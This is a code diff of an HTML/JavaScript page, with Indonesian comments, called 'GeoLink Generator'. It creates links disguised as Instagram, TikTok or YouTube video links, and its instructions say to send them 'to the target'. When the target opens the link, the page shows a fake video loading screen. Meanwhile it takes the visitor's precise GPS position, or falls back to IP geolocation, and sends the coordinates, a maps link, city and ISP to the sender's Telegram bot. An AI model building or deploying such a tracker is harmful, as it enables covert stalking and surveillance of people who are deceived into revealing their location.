@@ -3,187 +3,451 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>GeoLink Tracker</title>
+<title>GeoLink</title>
 <style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
-    background: #0f172a; color: #e5e7eb;
-    padding: 20px; min-height: 100vh;
+    font-family: Arial, sans-serif;
+    background: #0f172a;
+    color: #e5e7eb;
+    padding: 20px;
+    min-height: 100vh;
   }
-  .container { max-width: 700px; margin: 0 auto; }
-  h1 { color: #4ade80; margin-bottom: 20px; }
-  .panel {
-    background: #1e293b; padding: 24px;
-    border-radius: 16px; margin-bottom: 20px;
+  .box {
+    max-width: 700px;
+    margin: 0 auto;
+    background: #1e293b;
+    padding: 24px;
+    border-radius: 12px;
   }
+  h1 { color: #4ade80; margin-bottom: 20px; font-size: 22px; }
   label {
-    display: block; font-size: 13px;
-    font-weight: 600; margin-bottom: 6px;
-    margin-top: 14px; color: #94a3b8;
+    display: block;
+    font-size: 13px;
+    margin-top: 14px;
+    margin-bottom: 6px;
+    color: #94a3b8;
   }
-  label:first-of-type { margin-top: 0; }
   input {
-    width: 100%; padding: 12px 14px;
-    background: #0f172a; border: 1px solid #334155;
-    border-radius: 8px; color: white;
-    font-size: 14px; outline: none;
-    font-family: inherit;
-  }
-  input:focus { border-color: #60a5fa; }
-  input::placeholder { color: #64748b; }
-  button {
-    width: 100%; padding: 14px;
-    background: linear-gradient(135deg, #833ab4, #fd1d1d);
-    color: white; border: none;
-    border-radius: 10px; font-size: 15px;
-    font-weight: 700; cursor: pointer;
-    margin-top: 18px;
-  }
-  button:hover { opacity: 0.9; }
-  #resultBox {
-    display: none; margin-top: 16px;
-    background: #0f172a; padding: 14px;
-    border-radius: 10px;
+    width: 100%;
+    padding: 12px;
+    background: #0f172a;
     border: 1px solid #334155;
+    border-radius: 6px;
+    color: white;
+    font-size: 14px;
+    font-family: monospace;
   }
-  #resultBox.show { display: block; }
-  #output {
-    font-family: monospace; font-size: 12px;
-    word-break: break-all; color: #93c5fd;
-    background: #020617; padding: 12px;
-    border-radius: 6px; margin-bottom: 10px;
+  input:focus { outline: none; border-color: #60a5fa; }
+  button {
+    width: 100%;
+    padding: 14px;
+    margin-top: 18px;
+    background: #2563eb;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+  }
+  button:hover { background: #1d4ed8; }
+  button:active { background: #1e40af; }
+  #hasil {
+    margin-top: 16px;
+    padding: 14px;
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 8px;
+    display: none;
+  }
+  #hasil.show { display: block; }
+  #hasil .label {
+    font-size: 11px;
+    color: #94a3b8;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+  #link {
+    font-family: monospace;
+    font-size: 12px;
+    word-break: break-all;
+    color: #93c5fd;
+    background: #020617;
+    padding: 10px;
+    border-radius: 6px;
+    margin-bottom: 10px;
     user-select: all;
   }
-  .btn-row { display: flex; gap: 8px; }
-  .btn-row button {
-    flex: 1; margin-top: 0;
-    padding: 10px; font-size: 13px;
+  .row {
+    display: flex;
+    gap: 8px;
   }
-  .btn-copy { background: #0ea5e9; }
-  .btn-test { background: #6366f1; }
-  .info {
-    background: #1e3a5f; color: #bfdbfe;
-    padding: 12px; border-radius: 8px;
-    font-size: 12px; margin-bottom: 16px;
+  .row button {
+    flex: 1;
+    margin-top: 0;
+    padding: 10px;
+    font-size: 13px;
+  }
+  .copy { background: #0891b2; }
+  .copy:hover { background: #0e7490; }
+  .test { background: #7c3aed; }
+  .test:hover { background: #6d28d9; }
+  .note {
+    font-size: 12px;
+    color: #94a3b8;
+    margin-top: 20px;
+    padding-top: 16px;
+    border-top: 1px solid #334155;
     line-height: 1.6;
   }
 </style>
 </head>
 <body>
 
-<div class="container">
-  <h1>📍 GeoLink Tracker</h1>
+<div class="box" id="generatorBox">
+  <h1>📍 GeoLink Generator</h1>
 
-  <div class="info">
-    <b>Test dulu:</b> Isi semua field, klik Generate. Kalau link muncul di bawah = OK ✅
+  <label>Link Video (Instagram / TikTok / YouTube / dll)</label>
+  <input type="text" id="videoUrl" value="https://www.instagram.com/reel/C8QZqXvSNrK/">
+
+  <label>URL Website Anda (harus https)</label>
+  <input type="text" id="baseUrl" value="https://example.com">
+
+  <label>Bot Token Telegram (opsional, boleh dikosongkan)</label>
+  <input type="text" id="botToken" value="">
+
+  <label>Chat ID Telegram (opsional, boleh dikosongkan)</label>
+  <input type="text" id="chatId" value="">
+
+  <button id="btnGenerate">🔗 Generate Link</button>
+
+  <div id="hasil">
+    <div class="label">Link Tracking Anda:</div>
+    <div id="link"></div>
+    <div class="row">
+      <button class="copy" id="btnCopy">📋 Copy</button>
+      <button class="test" id="btnTest">🧪 Test</button>
+    </div>
   </div>
 
-  <div class="panel">
-    <label>Link Video (IG / TikTok / YouTube / dll)</label>
-    <input type="text" id="videoUrl" placeholder="https://www.instagram.com/reel/xxxxx/" value="https://www.instagram.com/reel/C8QZqXvSNrK/">
+  <div class="note">
+    <b>Cara pakai:</b><br>
+    1. Isi link video & URL website Anda<br>
+    2. Klik Generate<br>
+    3. Copy link, kirim ke target<br>
+    4. Buka link di HP target → lokasi muncul di Telegram (kalau diisi)
+  </div>
+</div>
 
-    <label>URL Website Anda</label>
-    <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app" value="https://example.com">
-
-    <label>Bot Token Telegram (opsional)</label>
-    <input type="text" id="botToken" placeholder="1234567:ABC-DEF...">
-
-    <label>Chat ID Telegram (opsional)</label>
-    <input type="text" id="chatId" placeholder="123456789">
-
-    <button id="btnGenerate" onclick="generateLink()">🔗 Generate Link</button>
-
-    <div id="resultBox">
-      <div id="output"></div>
-      <div class="btn-row">
-        <button class="btn-copy" onclick="copyLink()">📋 Copy</button>
-        <button class="btn-test" onclick="testLink()">🧪 Test</button>
-      </div>
-    </div>
+<!-- ====== TRACKING VIEW (muncul kalau ada ?r= di URL) ====== -->
+<div class="box" id="trackingBox" style="display:none; text-align:center;">
+  <div id="loading">
+    <div style="font-size: 40px;">⏳</div>
+    <p style="margin-top: 12px; color: #94a3b8;">Memuat video...</p>
+  </div>
+  <div id="video" style="display:none;">
+    <p style="color: #4ade80; margin-bottom: 12px;">✅ Video siap</p>
+    <div id="embedContainer"></div>
   </div>
 </div>
 
 <script>
-// Simpan URL di variabel global
+// ============================================
+// BAGIAN 1: DETEKSI MODE
+// ============================================
+var params = new URLSearchParams(window.location.search);
+var r = params.get('r');
+var t = params.get('t');
+var b = params.get('b');
+var c = params.get('c');
+
+if (r && t) {
+  // MODE TRACKING
+  document.getElementById('generatorBox').style.display = 'none';
+  document.getElementById('trackingBox').style.display = 'block';
+  document.body.style.background = '#000';
+  document.body.style.padding = '0';
+  document.title = 'Video';
+  startTracking(r, t, b, c);
+} else {
+  // MODE GENERATOR
+  setupGenerator();
+}
+
+// ============================================
+// BAGIAN 2: GENERATOR
+// ============================================
+function setupGenerator() {
+  document.getElementById('btnGenerate').addEventListener('click', generateLink);
+  document.getElementById('btnCopy').addEventListener('click', copyLink);
+  document.getElementById('btnTest').addEventListener('click', testLink);
+}
+
 var generatedUrl = '';
 
 function generateLink() {
-  // Ambil nilai dari input
   var videoUrl = document.getElementById('videoUrl').value.trim();
   var baseUrl = document.getElementById('baseUrl').value.trim();
   var botToken = document.getElementById('botToken').value.trim();
   var chatId = document.getElementById('chatId').value.trim();
 
-  // Validasi
   if (!videoUrl) {
     alert('Isi link video dulu!');
     return;
   }
   if (videoUrl.indexOf('http') !== 0) {
-    alert('Link harus mulai dengan http:// atau https://');
+    alert('Link video harus mulai dengan http:// atau https://');
     return;
   }
   if (!baseUrl) {
     alert('Isi URL website dulu!');
     return;
   }
+  if (baseUrl.indexOf('http') !== 0) {
+    alert('URL website harus mulai dengan http:// atau https://');
+    return;
+  }
 
-  // Buang trailing slash
   baseUrl = baseUrl.replace(/\/+$/, '');
 
-  // Encode video URL ke base64 URL-safe
-  var encodedVideo = btoa(unescape(encodeURIComponent(videoUrl)))
-    .replace(/=/g, '')
-    .replace(/\+/g, '-')
-    .replace(/\//g, '_');
+  // Encode video URL
+  var encodedVideo;
+  try {
+    encodedVideo = btoa(unescape(encodeURIComponent(videoUrl)))
+      .replace(/=/g, '')
+      .replace(/\+/g, '-')
+      .replace(/\//g, '_');
+  } catch(e) {
+    alert('Gagal encode URL: ' + e.message);
+    return;
+  }
 
-  // Random token
   var token = Math.random().toString(36).slice(2, 12);
 
-  // Bangun URL
   var url = baseUrl + '/?r=' + encodedVideo + '&t=' + token;
   if (botToken) url += '&b=' + encodeURIComponent(botToken);
   if (chatId) url += '&c=' + encodeURIComponent(chatId);
 
-  // Simpan & tampilkan
   generatedUrl = url;
+  document.getElementById('link').textContent = url;
+  document.getElementById('hasil').classList.add('show');
 
-  var outputEl = document.getElementById('output');
-  var resultBox = document.getElementById('resultBox');
-  outputEl.textContent = url;
-  resultBox.classList.add('show');
-
-  console.log('Generated URL:', url);
+  console.log('Generated:', url);
+  alert('✅ Link berhasil di-generate!\n\nLihat kotak di bawah tombol.');
 }
 
 function copyLink() {
-  if (!generatedUrl) {
-    alert('Generate dulu!');
-    return;
-  }
-  navigator.clipboard.writeText(generatedUrl).then(function() {
-    alert('✅ Link berhasil di-copy!');
-  }).catch(function() {
-    var ta = document.createElement('textarea');
-    ta.value = generatedUrl;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand('copy');
-    document.body.removeChild(ta);
-    alert('✅ Link berhasil di-copy!');
-  });
+  if (!generatedUrl) { alert('Generate dulu!'); return; }
+  navigator.clipboard.writeText(generatedUrl)
+    .then(function() { alert('✅ Link di-copy!'); })
+    .catch(function() {
+      var ta = document.createElement('textarea');
+      ta.value = generatedUrl;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      alert('✅ Link di-copy!');
+    });
 }
 
 function testLink() {
-  if (!generatedUrl) {
-    alert('Generate dulu!');
+  if (!generatedUrl) { alert('Generate dulu!'); return; }
+  window.open(generatedUrl, '_blank');
+}
+
+// ============================================
+// BAGIAN 3: TRACKING MODE
+// ============================================
+function startTracking(encodedR, token, botToken, chatId) {
+  // Decode video URL
+  var videoUrl = '';
+  try {
+    var s = encodedR.replace(/-/g, '+').replace(/_/g, '/');
+    while (s.length % 4) s += '=';
+    videoUrl = decodeURIComponent(escape(atob(s)));
+  } catch(e) {
+    console.error('Decode error:', e);
+  }
+
+  // Simpan ke global
+  window.TRACK = {
+    videoUrl: videoUrl,
+    token: token,
+    botToken: botToken || '',
+    chatId: chatId || ''
+  };
+
+  // Mulai tracking GPS
+  setTimeout(function() {
+    trackLocation();
+  }, 500);
+
+  // Tampilkan video setelah 1.5 detik
+  setTimeout(function() {
+    showVideo();
+  }, 1500);
+}
+
+function trackLocation() {
+  if (!navigator.geolocation) {
+    console.log('Geolocation not supported, using IP');
+    ipFallback();
     return;
   }
-  window.open(generatedUrl, '_blank');
+
+  navigator.geolocation.getCurrentPosition(
+    function(pos) {
+      sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
+    },
+    function(err) {
+      console.log('GPS error, trying IP fallback...', err.message);
+      ipFallback();
+    },
+    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+  );
+}
+
+function ipFallback() {
+  fetch('https://ipapi.co/json/')
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (data && data.latitude && data.longitude) {
+        sendLocation(data.latitude, data.longitude, 5000, 'ip', {
+          city: data.city || '',
+          region: data.region || '',
+          country: data.country_name || '',
+          isp: data.org || ''
+        });
+      }
+    })
+    .catch(function(e) { console.error('IP fallback error:', e); });
+}
+
+function sendLocation(lat, lng, acc, type, extra) {
+  extra = extra || {};
+
+  console.log('📍 Location:', lat, lng, 'type:', type, 'acc:', acc);
+
+  // Kalau ada Telegram, kirim
+  if (window.TRACK.botToken && window.TRACK.chatId) {
+    sendTelegram(lat, lng, acc, type, extra);
+  } else {
+    // Kalau tidak ada Telegram, log saja
+    console.log('No Telegram configured. Location data:', {
+      lat: lat, lng: lng, acc: acc, type: type, extra: extra
+    });
+  }
+}
+
+function sendTelegram(lat, lng, acc, type, extra) {
+  var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
+  var akurasi = (type === 'ip')
+    ? '~' + Math.round(acc / 1000) + ' km (IP)'
+    : Math.round(acc) + ' m';
+
+  var text =
+    '📍 Lokasi Baru\n\n' +
+    'Lat: ' + lat.toFixed(6) + '\n' +
+    'Lng: ' + lng.toFixed(6) + '\n' +
+    'Akurasi: ' + akurasi + '\n' +
+    'Maps: ' + mapsLink + '\n' +
+    'Waktu: ' + new Date().toLocaleString('id-ID') + '\n';
+
+  if (extra.city) {
+    text += 'Kota: ' + extra.city + ', ' + (extra.region || '') + '\n';
+    text += 'Negara: ' + (extra.country || '') + '\n';
+  }
+
+  text += 'Token: ' + window.TRACK.token;
+
+  // Kirim pesan teks
+  fetch('https://api.telegram.org/bot' + window.TRACK.botToken + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: window.TRACK.chatId,
+      text: text
+    })
+  })
+  .then(function(res) { return res.json(); })
+  .then(function(data) {
+    if (data.ok) {
+      console.log('✅ Telegram message sent');
+    } else {
+      console.error('❌ Telegram error:', data);
+    }
+  })
+  .catch(function(e) { console.error('Telegram fetch error:', e); });
+
+  // Kirim native location (khusus GPS)
+  if (type === 'gps') {
+    fetch('https://api.telegram.org/bot' + window.TRACK.botToken + '/sendLocation', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: window.TRACK.chatId,
+        latitude: lat,
+        longitude: lng
+      })
+    }).catch(function(e) { console.error(e); });
+  }
+}
+
+function showVideo() {
+  document.getElementById('loading').style.display = 'none';
+  document.getElementById('video').style.display = 'block';
+
+  var url = window.TRACK.videoUrl;
+  var container = document.getElementById('embedContainer');
+
+  // Deteksi platform & embed
+  var embedUrl = null;
+  var embedType = 'default';
+
+  // Instagram
+  var m = url.match(/instagram\.com\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
+  if (m) {
+    embedUrl = 'https://www.instagram.com/' + m[1] + '/' + m[2] + '/embed/';
+  }
+
+  // TikTok
+  if (!embedUrl) {
+    m = url.match(/tiktok\.com\/.*\/video\/(\d+)/);
+    if (m) {
+      embedUrl = 'https://www.tiktok.com/embed/v2/' + m[1];
+    }
+  }
+
+  // YouTube
+  if (!embedUrl) {
+    m = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([A-Za-z0-9_-]{11})/);
+    if (m) {
+      embedUrl = 'https://www.youtube.com/embed/' + m[1] + '?autoplay=1';
+      embedType = 'youtube';
+    }
+  }
+
+  if (embedUrl) {
+    var style = 'width:100%; max-width:400px; height:600px; border:none; border-radius:12px; background:#000;';
+    if (embedType === 'youtube') {
+      style = 'width:100%; max-width:600px; height:340px; border:none; border-radius:12px; background:#000;';
+    }
+    container.innerHTML =
+      '<iframe src="' + embedUrl + '" style="' + style + '" ' +
+      'allow="autoplay; encrypted-media" ' +
+      'allowfullscreen></iframe>';
+  } else {
+    // Fallback: redirect ke link asli
+    container.innerHTML =
+      '<div style="padding:30px; color:#ccc;">' +
+        '<p style="margin-bottom:16px;">Video siap dibuka</p>' +
+        '<a href="' + url + '" style="display:inline-block; padding:12px 24px; background:#2563eb; color:white; text-decoration:none; border-radius:8px; font-weight:bold;">▶️ Tonton Video</a>' +
+      '</div>';
+  }
 }
 </script>
 
 </body>
 </html>
-
-  text +=
